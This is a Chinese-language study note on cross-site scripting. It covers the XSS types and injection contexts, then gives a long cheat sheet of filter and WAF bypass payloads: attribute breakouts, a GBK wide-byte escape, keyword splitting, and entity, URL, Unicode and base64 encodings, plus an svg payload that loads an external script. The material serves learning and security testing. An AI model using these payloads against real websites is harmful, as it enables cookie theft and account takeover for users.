## XSS

- 基础
- 定义和危害
- XSS分类
  - 反射XSS
  - 存储式XSS
  - DOM XSS
- XSS的触发
- XSS过滤和绕过
- cheetsheets

### XSS基础补充

HTML是由众多标签组成的，标签内还有对应的各种属性。这些标签可以不区分大小写，有的可以不需要闭合。属性的值可以用单引号，双引号，反单引号包围住，甚至不需要引号。多余的空格与tab毫不影响HTML的解析。

DOM全程Document Object Model，文档对象模型，就是浏览器将HTML/XML这样的文档抽象成一个树形结构。这样方便JS进行读写操作。

HttpOnly机制:设置此标志后，客户端脚本无法读写cookie。

Secure Cookie机制:设置此标记的cookie仅在HTTPS层面安全传输。

#### 定义：

恶意代码（HTML/客户端脚本）被注入到web应用中，恶意代码被植入到其他用户使用的页面中。

#### 危害：

1.盗取用户账号

2.控制企业数据-读取篡改添加删除

3.非法转账

4.强制发送电子邮件

5.控制受害者重定向

6.cookie的session id盗取，冒充登录

7.钓鱼

…

具体危害和利用的例子可以看这篇文章

[https://www.sqlsec.com/2020/10/xss2.html#%E6%80%BB%E7%BB%93](https://www.sqlsec.com/2020/10/xss2.html#总结)

## XSS类型

### 1.反射式XSS

反射型 XSS 只是简单地把用户输入的数据 “反射” 给浏览器。也就是说，黑客往往需要诱使用户 “点击” 一个恶意链接，才能攻击成功。

特点：浏览时触发，只执行一次，非持久化。

测试：测试每一个可能的入口

- URL文件路径


- URL查询字符串中的参数


- HTTP头文件


### 2.存储式XSS

XSS payload被存储在网络应用的服务器中，然后在其它用户访问时运行

例子：

一个允许用户发表评论的博客网站。不幸的是，这些评论并没有检查它们是否含有JavaScript，也没有过滤掉任何恶意代码。如果我们现在发布一个含有JavaScript的评论，这将被存储在数据库中，现在访问该文章的每一个其他用户都会在他们的浏览器中运行这个JavaScript。（可能用于盗取cookie）

对于存储型的输出，一般位于

- 表单提交后跳转的页面
- 表单所在的页面
- 表单提交后不见了，则需要在整个网站寻找输出点。(可以使用爬虫)

### 3.DOM based XSS

它和反射型 XSS、存储型 XSS 的差别在于，DOM XSS 的 XSS 代码并不需要服务器解析响应的直接参与，触发 XSS 靠的就是浏览器端的 DOM 解析，可以认为完全是客户端的事情。

测试:寻找js代码中有攻击者可以控制的某些变量的部分，之后看他们如何被处理，是否被写入DOM，被传递给不安全的js方法，比如eval()



### XSS的触发

#### 1.HTML标签之间 

``` js
<div></div>   #直接触发即可
```

``` js
<title></title>
<textarea></textarea>
<xmp></xmp>
<iframe></iframe>
<noscript></noscript>
<noframes></noframes>
<plaintext></plaintext>
#需要先闭合标签
```

``` js
<script></script>
<style><style>
#闭合标签或者利用标签可执行脚本的特性构造特殊的payload
```

#### 2.HTML之内

``` js
<input type="text" value="[输出]" />
```

最常见的位置如上所示，可以采取两种方式闭合

1.闭合属性，然后使用on时间触发

``` js
"onmouseover=alert(1) x="
```

2.闭合属性和标签，直接执行

``` js
"><script>alert(1)</scrip>
```

当遇到如下场景，只能闭合input标签，否则由于hidden无法触发on事件

``` js
<input type="hidden" value="[输出]" />
#只能闭合input标签
```

但是如果调换属性的顺序，则可以闭合属性，使用on事件

``` js
<input value="[输出]" type="hidden"/>
#PAYLOAD:
1" onmouseover=alert(1) type="text
#将输出变成一个标准的输入框，鼠标移上去就可以触发XSS
```

#### 3.on事件内

不同的场景有不同的闭合策略

#### 4.输出在style属性内

ie浏览器的特性：可以在style中执行脚本

``` js
<a href="#" style=“width:[输出]">click me</a>
PAYLOAD:
1;xss:expression(if(!windows.x){alert(1);window.x=1;})
#在style属性内注入expression关键词，并且适当的闭合，就可以触发XSS
```

## 测试payload

```js
"><svg/onload=alert(1)//
<a href="javascript:alert(1)" >click me</a>       
//a标签伪协议执行
<a href="data:text/html;base64,这里跟着base64之后的js代码">click here</a>        
//data引用外域资源
<svg/onload=s=createElement('script');body.appendChild(s);s.src='js地址'//
//引用外部js

```



## XSS过滤和绕过

### DOM XSS

#### 1.DOM渲染

##### HTML和javascript自解码机制

``` js
<input type="button" id="exec_btn" value="exec" onclick="document.write([输出])" />
```

如果使用html encode的payload:

``` js
HtmlEncode('<img src=@ onerror=alert(123) />')
```

点击之后不会执行alert(123)，因为被html编码了

但是如果使用如下payload

``` js
'&lt;img src=@ onerror=alert(123) /&gt;'
```

就会执行，因为此处的javascript代码(document.write)在HTML标签中

这里的JavaScript代码可以被HTML形式编码

##### HTML编码

- ##### 进制编码：&#xH;、&#D;

- ##### HTML实体编码

在JavaScript执行 之前，HTML编码会先被decode，因此第二个payload可以执行，但是第一个不可以(执行javascript之后被函数编码)

但是如果不是在HTML标签中，而是在<script>标签中那么就不会被HTML形式解码，因此，在下面的<script>标签中：

```js
<input type="button" id="exec_btn" value="exec" />
<script>
  function $(id){return document.getElementById(id);};
  $('exec_btn').onclick = function(){
    document.write('<img src=@ onerror=alert(123) />');
    //document.write('&lt;img src=@ onerror=alert(123) /&gt;');
  }
</script>
```

如果使用注释中的经过html实体编码后的payload，则无法被解码执行。

而在JavaScript上下文环境中，在执行前JavaScript编码会被自动解码

##### JavaScript编码

- Unicodei形式: \uH(Hex)
- 普通十六进制:\xH
- 特殊字符转义: 在" '等特殊字符前加\转义

#### 2.DOM修正式渲染

在DOM XSS中需要研究的不是查看源码的静态结果

而应该是F12或者执行javascript语句：

``` js
document.documentElement.innerHTML
```

来查看动态的结果

通过查看动态结果，可以看到浏览器/过滤器对DOM渲染的修正，不同浏览器的修正可能存在一些差异，查看这些修正式的渲染可以用于绕过从而XSS

#### 3.字符和字符集

##### 字符

肉眼可见的文字/符号单元就是一个字符，可能对应1~n个字节，一个字节对应8bit

##### 字符集

一个字符和对应的1~n个字节是由字符集（编码方式）决定的。

而宽字节（2字节）会带来安全问题：吃ASCII

###### 宽字节编码

- GBK,GB2312,GB18030,BIG5,SHIFT_JIS
- GBK:第一字节（高字节0x81~0xFE）第二字节（低字节 0x40~0x7E 与 0x80~0xFE）

##### 宽字节编码带来的安全问题

下面的代码（php magic_quotes_gpc= On）

```js 
<?php header("Content-Type:text/html;charset=GBK"); ?>
<head>
<title> gb xss </title>
</head>
<script>
a = "<?php echo $_GET['x'];?>";
</script>
```

需要闭合双引号

PAYLOAD:

``` js
fail:
gb.php?x=1";alert(1)//
#双引号会被转义,闭合失败
success:
gb.php?x=1%81";alert(1)//
#双引号被转义，变成下面的代码
gb.php?x=1%81\";alert(1)//
#a="1[0x81]\";alery(1)//;
```

[0x81]\组成了一个合法字符，从而闭合双引号，触发XSS

#### 4.弹窗关键字检测和绕过

WAF过滤的常见函数

- 弹窗函数：alert()、prompt()、confirm()
- 代码执行函数eval()

绕过方式：分割

- 添加空格、回车、换行：alert%20(/xss/)、%0A、%0D、%09

  ```js
  //也可以使用html编码后的回车/换行/Tab添加
  1.<iframe src=javas&#x09;cript:alert(1)></iframe> //Tab
  2.<iframe src=javas&#x0A;cript:alert(1)></iframe> //回车
  3.<iframe src=javas&#x0D;cript:alert(1)></iframe> //换行
  4.<iframe src=javascript&#x003a;alert(1)></iframe> //编码冒号
  5.<iframe src=javasc&NewLine;ript&colon;alert(1)></iframe> //HTML5 新增的实体命名编码，IE6、7下不支持
  
  ```

  

- 多行注释

  ```js
  alert/*abcd*/(/xss/)
  ```

- 注释换行

  ```js
  alert//abcd%0A(/xss/)
  ```

- ''代替括号alert'xss'

- 括号分割((alert))(/xss/)

  ```js
  //使用window，top，prompt
  <img src=x onerror="window['al'+'ert'](0)"></img>
  <img src=x onerror="window.alert(0)"></img>
  <img src=x onerror="top['al'+'ert'](0)"></img>
  <img src=x onerror="top.alert(0)"></img>
  <img src=x onerror=prompt(document.cookie)>
  //使用下面的payload
  <input/onfocus=_=alert,_(123)>
  <input/onfocus=_=alert,xx=1,_(123)>
  <input/onfocus=_=alert;_(123)>
  <input/onfocus=_=alert;xx=1;_(123)>
  <input/onfocus=_=window['alert'],_(123)>
  <input/onfocus=_=window.alert,_(123)>
  <input/%00/autofocus=""/%00/onfocus=.1|alert`XSS`> 
  //异常处理
  <svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
  //eavl(string)参数关键词是字符串可以拼接
  <svg/onload=eval('ale'+'rt(1)')>
  ```

  ### 5.编码绕过

  ##### 1.html实体编码

  ``` html
  <iframe src=javascript:alert(1)>
  //十进制
  <iframe src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
  //十六进制
  <iframe src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
  //不带分号
  <iframe src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x31&#x29>
  //可以填充0
  <iframe src=&#x0006A&#x00061&#x00076&#x00061&#x00073&#x00063&#x00072&#x00069&#x00070&#x00074&#x0003A&#x00061&#x0006C&#x00065&#x00072&#x00074&#x00028&#x00031&#x00029>
  ```

  ##### 2.URL编码

  ```html
  <a href="{here}">xx</a>
  <iframe src="{here}">
  //当输出环境在src，href中，可以js伪协议执行JS
  //如下
  <iframe src=”javascript:alert(1)”>test</iframe>
  //可以URL编码（协议头javascript不能编码）
  //编码后如下
  <a href="javascript:%61%6c%65%72%74%28%31%29">xx</a>
  <iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
  //可以二次URL编码
  <iframe src="javascript:%2561%256c%2565%2572%2574%2528%2531%2529"></iframe>
  //也可结合上面的16进制编码javacript协议头
  <iframe src="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;%61%6c%65%72%74%28%31%29"></iframe>
  ```

  ##### 3.Unicode编码

  ```html
  //Unicode，8进制，16进制
  1.<svg/onload=setTimeout('\x61\x6C\x65\x72\x74\x28\x31\x29')>
  2.<svg/onload=setTimeout('\141\154\145\162\164\050\061\051')>
  3.<svg/onload=setTimeout('\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029')>
  4.<script>eval("\x61\x6C\x65\x72\x74\x28\x31\x29")</script>
  5.<script>eval("\141\154\145\162\164\050\061\051")</script>
  6.<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>
  //eval()可以使用window['eavl']
  1.<script>window['eval']("\x61\x6C\x65\x72\x74\x28\x31\x29")</script>
  2.<script>window['eval']("\141\154\145\162\164\050\061\051")</script>
  3.<script>window['eval']("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>
  ```

  ##### 4.Base64编码

  ```html
  <a href="data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">test</a>
  <iframe src="data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="></iframe>
  ```

  ##### 5.atob函数

  ```js
  1.<a%20href=javascript:eval(atob('YWxlcnQoMSk='))>Click</a>
  2.<a%20href=javascript:eval(window.atob('YWxlcnQoMSk='))>Click</a>
  3.<a%20href=javascript:eval(window['atob']('YWxlcnQoMSk='))>Click</a>
  ```

  YWxlcnQoMSk=是alert(1)的base64编码

  ##### 6.String.fromCharCode

  ```js
   <a href='javascript:eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))'>Click</a>
  ```

  ##### 7.结合Unicode->URL->HTML三种编码

  ```js
  <a href=javascript:\u0061\u006C\u0065\u0072\u0074(1)>Click</a>
  <a href=javascript:%5c%75%30%30%36%31%5c%75%30%30%36%43%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)>Click</a>
  <a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#37;&#53;&#99;&#37;&#55;&#53;&#37;&#51;&#48;&#37;&#51;&#48;&#37;&#51;&#54;&#37;&#51;&#49;&#37;&#53;&#99;&#37;&#55;&#53;&#37;&#51;&#48;&#37;&#51;&#48;&#37;&#51;&#54;&#37;&#52;&#51;&#37;&#53;&#99;&#37;&#55;&#53;&#37;&#51;&#48;&#37;&#51;&#48;&#37;&#51;&#54;&#37;&#51;&#53;&#37;&#53;&#99;&#37;&#55;&#53;&#37;&#51;&#48;&#37;&#51;&#48;&#37;&#51;&#55;&#37;&#51;&#50;&#37;&#53;&#99;&#37;&#55;&#53;&#37;&#51;&#48;&#37;&#51;&#48;&#37;&#51;&#55;&#37;&#51;&#52;&#40;&#49;&#41;>Click</a>
  ```

  同样可以弹窗

  ##### HTTPonly绕过 

## XSS cheetsheets

#### XSS Filter Evasion Cheat Sheet

https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

##### Cross-site scripting (XSS) cheat sheet POSTSWIGGER

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

#### xxsfilterbypass-github

https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec
